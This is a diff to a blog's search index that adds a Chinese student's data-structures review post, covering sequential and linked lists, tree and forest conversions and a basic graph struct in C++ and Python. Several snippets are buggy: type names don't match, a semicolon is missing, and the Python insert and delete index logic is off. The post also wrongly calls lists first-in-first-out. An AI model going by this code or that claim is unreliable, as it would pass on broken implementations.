-        <category>大二课程</category>
-      </categories>
-      <tags>
-        <tag>复习</tag>
-        <tag>总结</tag>
-        <tag>数据结构</tag>
       </tags>
   </entry>
   <entry>
@@ -2388,6 +2327,95 @@ SELECT , INSERT , UPDATE , DELETE</p>
       <tags>
         <tag>项目管理</tag>
         <tag>项目流程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>数据结构复习</title>
+    <url>/2023/02/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[<h1>前言</h1>
+<p>写这篇文章的目的呢，主要是当做笔记了，现在都已经大二了数据结构与算法还是比较薄弱，感觉都不能叫菜了(哭，所以就写一篇相当于知识体系的博客吧，内容非常的基础，没什么亮点，<s>也没什么看的价值</s>。</p>
+<p>首先我们理一理这个数据结构，从大一开始我们就知道什么栈啊表啊什么的，那在这我们做一个简单的总结吧，简单数据结构首先可以分为表栈队树图，当然我知道这么分很垃，但是总体上大概可以看成这几类，那我们就一种一种来看。</p>
+<h1>表</h1>
+<p>首先看表，表这种数据结构很直观，先进先出，也很好理解，这里就记录一下各种不同的表以及实现方式。</p>
+<h2 id="顺序表">顺序表</h2>
+<p>首先我们先分配出一个数据结构</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  Maxsize 100  <span class="comment">//最大空间</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;<span class="comment">//typedef的作用是把这个结构体等价于类型名SqList</span></span><br><span class="line">	ElemType *elem;<span class="comment">//自定义数据类型，动态分配方式</span></span><br><span class="line"><span class="comment">//  ElemType data[Maxsize]//静态分配方式  </span></span><br><span class="line">	<span class="type">int</span> length; <span class="comment">// 顺序表的长度</span></span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure>
+<p>顺序表的存储方式如下，它的特点是只要索引正确，可以<strong>立即找到相对应的数值</strong>，对比有指针的那位…另外，第i个元素的值为L,elem[i-1]，这个细节留意一下。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InitList</span><span class="params">(SqList &amp;L)</span> <span class="comment">//构造一个空的顺序表L</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="comment">//L加&amp;表示引用类型参数，函数内部的改变跳出函数仍然有效</span></span><br><span class="line"><span class="comment">//不加&amp;内部改变，跳出函数后无效</span></span><br><span class="line">    L.elem=<span class="keyword">new</span> <span class="type">int</span>[Maxsize];    <span class="comment">//为顺序表分配Maxsize个空间</span></span><br><span class="line">    <span class="keyword">if</span>(!L.elem) <span class="keyword">return</span> <span class="literal">false</span>;      <span class="comment">//存储分配失败</span></span><br><span class="line">    L.length=<span class="number">0</span>;				<span class="comment">//空表长度为0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,size</span>):  <span class="comment"># initialization</span></span><br><span class="line">    self.<span class="built_in">max</span>=size        <span class="comment">#表的最大值</span></span><br><span class="line">    self.data=[<span class="literal">None</span>]*self.<span class="built_in">max</span> <span class="comment">#表的值</span></span><br><span class="line">    self.num=<span class="number">0</span>  <span class="comment">#当前该顺序表的长度，空表为0</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/11/09/zmNZ9QCjiFqcWXU.png" alt="image-20221108223419456.png"></p>
+<h3 id="插，删，找">插，删，找</h3>
+<p>任何一个数据结构都会具备基本的增删改查功能，取值和查找基本相同就不赘述了，这里讲讲插入和删除，首先在顺序表中第<em>i</em>个位置之前插入一个元素<em>e</em>，需要从最后一个元素开始，后移一位，…，直到把第<em>i</em>个元素也后移一位，然后把<em>e</em>放入第<em>i</em>个位置。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListInsert_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,<span class="type">int</span> e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length+<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;	 <span class="comment">//i值不合法</span></span><br><span class="line">	<span class="keyword">if</span>(L.length==Maxsize) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//存储空间已满</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=L.length<span class="number">-1</span>;j&gt;=i<span class="number">-1</span>;j--)</span><br><span class="line">	    L.elem[j+<span class="number">1</span>]=L.elem[j];   <span class="comment">//从最后一个元素开始后移，直到第i个元素后移</span></span><br><span class="line">	L.elem[i<span class="number">-1</span>]=e;              <span class="comment">//将新元素e放入第i个位置</span></span><br><span class="line">	L.length++;		     	<span class="comment">//表长增1</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">addnum</span>(<span class="params">self,value,index</span>):</span><br><span class="line">    <span class="keyword">if</span> index&gt;self.<span class="built_in">max</span>-<span class="number">1</span> <span class="keyword">or</span> index&lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    i=self.num</span><br><span class="line">    <span class="keyword">while</span> i&gt;=index:</span><br><span class="line">        self.data[i]=self.data[i-<span class="number">1</span>]</span><br><span class="line">        i-=<span class="number">1</span></span><br><span class="line">    self.data[index-<span class="number">1</span>]=value</span><br></pre></td></tr></table></figure>
+<p>而在顺序表中删除第<em>i</em>个元素，需要把该元素暂存到变量<em>e</em>，然后从<em>i</em>+1个元素开始前移，…，直到把第<em>n</em>个元素也前移一位，即可完成删除操作。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListDelete_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,<span class="type">int</span> &amp;e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((i&lt;<span class="number">1</span>)||(i&gt;L.length)) <span class="keyword">return</span> <span class="literal">false</span>;	 <span class="comment">//i值不合法</span></span><br><span class="line">	e=L.elem[i<span class="number">-1</span>];   <span class="comment">//将欲删除的元素保留在e中</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j=i;j&lt;=L.length<span class="number">-1</span>;j++)</span><br><span class="line">		L.elem[j<span class="number">-1</span>]=L.elem[j]; <span class="comment">//被删除元素之后的元素前移</span></span><br><span class="line">	L.length--; <span class="comment">//表长减1</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">deletenum</span>(<span class="params">self,index</span>):</span><br><span class="line">    <span class="keyword">if</span> index&gt;self.<span class="built_in">max</span> <span class="keyword">or</span> index&lt;<span class="number">1</span>:<span class="comment">#判断是否合法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    self.data[index-<span class="number">1</span>]=<span class="literal">None</span> <span class="comment">#删除元素</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index,self.<span class="built_in">max</span>):<span class="comment"># 依次移动</span></span><br><span class="line">        self.data[i-<span class="number">1</span>]=self.data[i]</span><br><span class="line">    self.data[self.num]=<span class="literal">None</span> <span class="comment">#最后一个数字要变为None</span></span><br></pre></td></tr></table></figure>
+<h2 id="链表">链表</h2>
+<p>链表呢就是有指针的表了，它像链条一样链接起各个元素，特点是插入和删除数据十分方便，但是寻找和读取数据能力欠佳。</p>
+<h3 id="单链表">单链表</h3>
+<p>单链表的图示图下：</p>
+<p><img src="https://s2.loli.net/2022/11/09/68OkI9CQHpL1B4t.png" alt="image2.png"></p>
+<p>每一个单独结构可以分成两部分，数据部分和指针部分（也有表达为数据域和指针域的），</p>
+<p>首先定义结构以及初始化，初始化的步骤呢就是先无中生有一个头节点，将他的指针域指向空即可。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Lnode</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> data; <span class="comment">//结点的数据域</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">LNode</span> *next; <span class="comment">//结点的指针域</span></span><br><span class="line">&#125;Lnode, *Linklist<span class="comment">//LinkList为指向结构体LNode的指针类型</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InitList_L</span><span class="params">(LinkList &amp;L)</span><span class="comment">//构造一个空的单链表L</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=<span class="keyword">new</span> LNode;     <span class="comment">//生成新结点作为头结点，用头指针L指向头结点</span></span><br><span class="line">	<span class="keyword">if</span>(!L)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">//生成结点失败</span></span><br><span class="line">	L-&gt;next=<span class="literal">NULL</span>;   <span class="comment">//头结点的指针域置空</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="创建单链表">创建单链表</h4>
+<p>修改指针的顺序原则：先修改没有指针标记的那一端。</p>
+<h5 id="头（前）插法">头（前）插法</h5>
+<p>这个呢代表着新的结构体是从头节点后面插入的，且每次插入都是从头节点插入，所以依次插入之后呢，结果会和插入的顺序相反，比如输入的序列是：1，2，3，4，那么实际生成的单链表是4-&gt;3-&gt;2-&gt;1。这里注意头节点是没有数据的噢~</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateList_H</span><span class="params">(LinkList &amp;L)</span><span class="comment">//前插法创建单链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	LinkList s; <span class="comment">//定义一个指针变量</span></span><br><span class="line">	L=<span class="keyword">new</span> LNode;<span class="comment">//新建头节点</span></span><br><span class="line">	L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//先建立一个带头结点的空链表</span></span><br><span class="line">	cin&gt;&gt;n;<span class="comment">//n表示元素数量</span></span><br><span class="line">	<span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">		s=<span class="keyword">new</span> LNode; <span class="comment">//生成新结点s</span></span><br><span class="line">		cin&gt;&gt;s-&gt;data; <span class="comment">//输入元素值赋给新结点的数据域</span></span><br><span class="line">		s-&gt;next=L-&gt;next;<span class="comment">//先修改没有标记的一端（指没有头指针标记）</span></span><br><span class="line">		L-&gt;next=s; <span class="comment">//将新结点s插入到头结点之后</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="尾插法">尾插法</h5>
+<p>尾插法就是指每次插入都从最后一个结构后面插入，插入完毕后修改尾指针指向。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateList_R</span><span class="params">(LinkList &amp;L)</span><span class="comment">//尾插法创建单链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	LinkList s, r;</span><br><span class="line">	L=<span class="keyword">new</span> LNode;</span><br><span class="line">	L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//先建立一个带头结点的空链表</span></span><br><span class="line">	r=L; <span class="comment">//尾指针r指向头结点</span></span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">		s=<span class="keyword">new</span> LNode;<span class="comment">//生成新结点</span></span><br><span class="line">		cin&gt;&gt;s-&gt;data; <span class="comment">//输入元素值赋给新结点的数据域</span></span><br><span class="line">		s-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		r-&gt;next=s;<span class="comment">//将新结点s插入尾结点*r之后</span></span><br><span class="line">		r=s;<span class="comment">//r指向新的尾结点s</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="取值，查找">取值，查找</h4>
+<p>单链表的取值不可以像顺序表一样直接找到任意一个元素，它只能从第一个节点开始往后依次找，一直找到第n个节点。而查找的话，可以定义一个p指针指向第一个元素节点并比较节点的数据域是否等于value。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetElem_L</span><span class="params">(LinkList L,<span class="type">int</span> i,<span class="type">int</span> &amp;e)</span><span class="comment">//单链表的取值</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//在带头结点的单链表L中查找第i个元素</span></span><br><span class="line">	<span class="comment">//用e记录L中第i个数据元素的值</span></span><br><span class="line">	<span class="type">int</span> j;</span><br><span class="line">	LinkList p;</span><br><span class="line">	p=L-&gt;next;<span class="comment">//p指向第一个结点，</span></span><br><span class="line">	j=<span class="number">1</span>; <span class="comment">//j为计数器</span></span><br><span class="line">	<span class="keyword">while</span>(j&lt;i&amp;&amp;p) <span class="comment">//顺链域向后扫描，直到p指向第i个元素或p为空</span></span><br><span class="line">    &#123;</span><br><span class="line">		p=p-&gt;next; <span class="comment">//p指向下一个结点</span></span><br><span class="line">		j++; <span class="comment">//计数器j相应加1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!p||j&gt;i)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//i值不合法i＞n或i&lt;=0</span></span><br><span class="line">	e=p-&gt;data; <span class="comment">//取第i个结点的数据域</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">LocateElem_L</span><span class="params">(LinkList L, <span class="type">int</span> e)</span> <span class="comment">//按值查找</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LinkList p;	<span class="comment">//在带头结点的单链表L中查找值为e的元素</span></span><br><span class="line">	p=L-&gt;next;</span><br><span class="line">	<span class="keyword">while</span>(p&amp;&amp;p-&gt;data!=e)<span class="comment">//顺链域向后扫描，直到p为空或p所指结点的数据域等于e</span></span><br><span class="line">		p=p-&gt;next; <span class="comment">//p指向下一个结点</span></span><br><span class="line">	<span class="keyword">if</span>(!p)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//查找失败p为NULL</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="树">树</h2>
+<h3 id="二叉树，树，森林间的转换">二叉树，树，森林间的转换</h3>
+<h4 id="树转二叉树">树转二叉树</h4>
+<ol>
+<li>树所有相邻兄弟节点之间加虚线</li>
+<li>树中每个节点只保留与长子（左孩子）的连线，删除与其他孩子的连线</li>
+<li>以跟节点为轴心，整棵树顺时针转45°。</li>
+</ol>
+<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/1b4cd5a818385c47.png" alt=""></p>
+<h4 id="森林转二叉树">森林转二叉树</h4>
+<ol>
+<li>每棵树转二叉树</li>
+<li>第一棵二叉树不动，第二棵树开始，依次把后一棵二叉树的根节点作为前一棵二叉树根节点的右孩子节点，直到所有二叉树连接在一起</li>
+</ol>
+<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/56dc9fc36f73271b.png" alt=""></p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/d81d04d2f23d3cae.png" alt=""></p>
+<h4 id="二叉树还原成树">二叉树还原成树</h4>
+<ol>
+<li>若某结点是其双亲的左孩子，则把该结点的右孩子、右孩子的右孩子等都与该结点的双亲结点用连线连起来</li>
+<li>删除原二叉树中所有双亲结点与右孩子结点之间的连线</li>
+<li>整理</li>
+</ol>
+<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/a44f2b8ca00935fb.png" alt=""></p>
+<h4 id="二叉树还原成森林">二叉树还原成森林</h4>
+<ol>
+<li>切开根节点右链上所有“双亲-右孩子”的关系，分为若干二叉树</li>
+<li>将这些二叉树还原为树</li>
+</ol>
+<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/8b51253149316860.png" alt=""></p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/3753eb66fcb5d9b4.png" alt=""></p>
+<h2 id="图">图</h2>
+<p>图分为节点结构和图结构，节点结构包括一条边的起点，终点和边的权重，图结构包括整个图的边数，节点数以及节点的集合。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">	<span class="type">char</span> a,b;<span class="comment">//起点和终点</span></span><br><span class="line">	<span class="type">int</span> w;<span class="comment">//权</span></span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">	<span class="type">int</span> len,n;<span class="comment">//长度和顶点个数</span></span><br><span class="line">	Node *list;<span class="comment">//节点集合</span></span><br><span class="line">&#125;Graph;</span><br></pre></td></tr></table></figure>
+<h3 id="初始化和构建图">初始化和构建图</h3>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">initList</span><span class="params">(Graph &amp;G)</span></span>&#123;</span><br><span class="line">	G.len=<span class="number">0</span>;</span><br><span class="line">	G.list=<span class="keyword">new</span> Node[MAX];</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetList</span><span class="params">(Graph &amp;G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cin&gt;&gt;G.len&gt;&gt;G.n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;G.n;i++)</span><br><span class="line">		cin&gt;&gt;node[i];<span class="comment">//这一步是输入节点名称，需全局定义一个字符数组。</span></span><br><span class="line">	G.list[<span class="number">0</span>].w=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;G.len;i++)</span><br><span class="line">		cin&gt;&gt;G.list[i].a&gt;&gt;G.list[i].b&gt;&gt;G.list[i].w;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>到这里一个完整的图就构建完毕了，关于图的算法有挺多，仍在摸索ing…</p>
+<p>参考文章：文中部分图片出自：<a href="https://blog.csdn.net/kindoms214/article/details/85699598">https://blog.csdn.net/kindoms214/article/details/85699598</a></p>
+<p>标记：持续施工中…</p>
+]]></content>
+      <categories>
+        <category>大二课程</category>
+      </categories>
+      <tags>
+        <tag>复习</tag>
+        <tag>总结</tag>
+        <tag>数据结构</tag>
       </tags>
   </entry>
 </search>
